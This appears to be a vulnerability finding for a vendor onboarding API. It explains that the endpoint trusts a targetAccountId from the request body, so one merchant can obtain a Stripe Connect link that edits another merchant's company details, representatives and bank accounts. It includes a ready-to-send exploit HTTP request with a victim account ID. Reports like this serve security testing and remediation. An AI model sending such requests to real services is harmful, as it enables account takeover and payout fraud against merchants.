diagnosis: The vendor onboarding link endpoint creates a Stripe Connect account link for targetAccountId directly from the request body. If an attacker submits the connected account ID of another merchant during pending onboarding or verification, the returned link can be used to alter company details, representative identities, and external bank accounts.
exploit_request:
POST /api/vendors/onboarding-link HTTP/1.1
Host: partner.retailmesh.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "targetAccountId": "acct_1P92VictimVendor00"
}
